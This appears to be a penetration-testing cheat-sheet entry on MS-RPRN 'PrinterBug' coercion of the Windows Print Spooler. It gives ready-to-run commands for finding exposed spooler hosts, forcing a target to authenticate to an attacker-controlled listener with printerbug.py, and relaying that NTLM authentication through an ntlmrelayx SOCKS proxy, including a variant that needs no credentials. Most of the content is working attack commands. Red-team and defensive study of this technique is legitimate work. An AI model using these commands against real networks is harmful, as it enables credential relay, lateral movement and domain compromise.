---
technique: MS-RPRN Abuse
category: mitm
targets: Windows Print Spooler Service
protocols: SMB, RPC
remote_capable: true
tags: mitm coercion ms-rprn printerbug print-spooler rpc smb ntlm-relay
---

# MS-RPRN Abuse (PrinterBug)

The Windows Print Spooler service exposes the `RpcRemoteFindFirstPrinterChangeNotificationEx` method via MS-RPRN. A domain user can call this method on any host running the spooler, forcing it to authenticate to an attacker-controlled host over SMB. The flaw is a "won't fix" and enabled by default.

## Windows

SpoolerScanner checks whether the spooler is listening before triggering coercion.

### Step 1: Import SpoolerScanner

#powershell #recon

Import SpoolerScanner before checking host reachability.

```powershell title:"Import SpoolerScanner module"
Import-Module .\Get-SpoolStatus.ps1
```
<!-- cheat -->

### Step 2: Scan hosts with SpoolerScanner

#powershell #recon

Check whether the Print Spooler service is reachable on a list of hosts.

```powershell title:"Check spooler availability across hosts with SpoolerScanner"
ForEach ($server in Get-Content servers.txt) { Get-SpoolStatus $server }
```
<!-- cheat
-->

## Linux

Use rpcdump to enumerate spooler availability, then printerbug to trigger authentication coercion.

### rpcdump

#python #recon #impacket

Check whether the Print Spooler RPC endpoint is registered on the target.

```sh title:"Check spooler RPC endpoint with rpcdump"
rpcdump.py "$rhost" | grep -A 6 "spoolsv"
```
<!-- cheat
import domain_ip
var rhost
-->

### printerbug

#python #coercion #password

Trigger the Print Spooler service on the target to authenticate to the attacker's listener.

```sh title:"Coerce spooler authentication to attacker host with printerbug"
printerbug.py "$domain"/"$user":"$pass"@"$rhost" "$lhost"
```
<!-- cheat
import domain_ip
import users
import passwords
import tun_ip
var rhost
-->

### Step 1: Relay auth via SOCKS (ntlmrelayx)

#python #relay #socks

Set up ntlmrelayx to relay an existing SMB authentication to the target and expose it as a SOCKS proxy.

```sh title:"Relay SMB auth to target via SOCKS with ntlmrelayx"
ntlmrelayx.py -t smb://"$rhost" -socks
```
<!-- cheat
import domain_ip
import tun_ip
var rhost
-->

### Step 2: Trigger spooler without credentials (printerbug)

#python #coercion #no-creds

Trigger the Print Spooler coercion through the SOCKS proxy without needing valid credentials.

```sh title:"Trigger spooler coercion through SOCKS proxy without credentials"
proxychains printerbug.py -no-pass "$domain"/"$user"@"$rhost" "$lhost"
```
<!-- cheat
import domain_ip
import users
import tun_ip
var rhost
-->
